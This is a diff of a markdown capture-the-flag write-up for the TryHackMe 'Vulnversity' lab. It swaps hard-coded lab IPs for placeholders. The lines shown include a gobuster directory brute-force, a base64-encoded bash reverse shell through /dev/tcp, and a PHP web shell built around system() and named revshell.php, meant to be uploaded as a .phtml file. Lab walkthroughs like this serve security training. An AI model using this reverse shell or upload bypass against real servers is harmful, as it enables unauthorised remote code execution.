@@ -115,7 +115,7 @@ gobuster --help
 
 Now use gobuster to bruteforce hidden directories on the server:
 ```
-gobuster dir -u http://10.10.228.255:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+gobuster dir -u http://<ip_address>:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 
 ![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/gobuster-scan.png)
@@ -130,7 +130,7 @@ Or why not create one?
 
 ```
 sudo apt install -y xclip
-echo "bash -i >& /dev/tcp/ip_address/port 0>&1" | base64 | xclip
+echo "bash -i >& /dev/tcp/<ip_address>/<port> 0>&1" | base64 | xclip
 echo '<?php echo system("echo sub | base64 -d | bash"); ?>' | sed s/sub/$(xclip -o)/g > revshell.php
 ```
 
@@ -171,7 +171,6 @@ phtml
 You will notice that phtml file has a different length than others. Also on the response tab we will see that it successfully uploaded the file.
 
 ![](https://github.com/catx0rr/tryhackme/blob/master/vulnversity/images/burp_success.png)
-
 
 Create a listener to initiate reverse shell.
 
